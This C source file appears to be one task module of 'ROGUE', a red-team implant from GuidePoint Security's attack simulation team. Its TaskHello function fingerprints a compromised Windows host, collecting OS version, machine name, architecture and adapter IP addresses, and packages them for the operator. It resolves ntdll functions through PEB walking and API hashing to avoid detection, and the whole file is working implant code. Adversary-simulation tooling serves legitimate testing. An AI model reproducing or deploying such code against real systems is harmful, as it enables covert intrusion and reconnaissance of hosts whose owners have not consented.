/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT32	OsMajorVersion;
	UINT32	OsMinorVersion;
	UINT8	IsAdmin;
	UINT8	Is64;
} TASK_HELLO_BUF;

typedef struct
{
	D_API( RtlGetVersion );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLGETVERSION	0x0dde5cdd /* RtlGetVersion */
#define H_API_RTLFREEHEAP	0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL		0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Requests implant and host information. Ignores
 * Buffer and Length as it is not needed.
 *
!*/
D_SEC( B ) DWORD TaskHello( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER Output )
{
	API			Api;
	TASK_HELLO_BUF		Thb;
	RTL_OSVERSIONINFOW	Ver;

	BOOL			Ret = FALSE;

	PCHAR			Dsk = NULL;
	PBUFFER			Out = NULL;
	PIP_ADAPTER_INFO	Nxt = NULL;
	PIP_ADAPTER_INFO	Pai = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Thb, sizeof( Thb ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );

	/* Init API */
	Api.RtlGetVersion = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLGETVERSION );
	Api.RtlFreeHeap   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Get version and create initial packet */
	Ver.dwOSVersionInfoSize = sizeof( Ver );
	Api.RtlGetVersion( &Ver );

	Thb.OsMajorVersion = Ver.dwMajorVersion;
	Thb.OsMinorVersion = Ver.dwMinorVersion;
	Thb.IsAdmin        = FALSE;

#if defined( _WIN64 )
	Thb.Is64           = TRUE;
#else
	Thb.Is64           = FALSE;
#endif

	/* Create buffer to hold information */
	if ( ( Out = BufferCreate() ) != NULL ) {
		/* Insert start of buffer */
		if ( BufferAddRaw( Out, &Thb, sizeof( Thb ) ) ) {
			/* Desktop name? */
			if ( ( Dsk = OsMachineName() ) != NULL ) {
				if ( ( Pai = OsIpAddress() ) != NULL ) {
					/* Append the desktop name and string */
					if ( BufferPrintf( Out, C_PTR( G_PTR( "%s\t" ) ), Dsk ) ) {
						/* Enumerate individual entries */
						for ( Nxt = C_PTR( Pai ) ; Nxt != NULL ; Nxt = Nxt->Next ) {
							/* Does not contain 0.0.0.0? */
							if ( HashString( Nxt->IpAddressList.IpAddress.String, 0 ) != 0xe176f26f ) {
								/* Insert the interface name and string */
								BufferPrintf( Out, C_PTR( G_PTR( "%s:%s;" ) ), Nxt->Description, Nxt->IpAddressList.IpAddress.String );
							};
						};
						Ret = BufferAddRaw( Output, Out->Buffer, Out->Length );
					};
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Pai );
					Pai = NULL;
				};
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Dsk );
				Dsk = NULL;
			};
		};
		/* Cleanup */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
		Out = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Thb, sizeof( Thb ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );

	/* Success or fail! */
	return Ret;
};
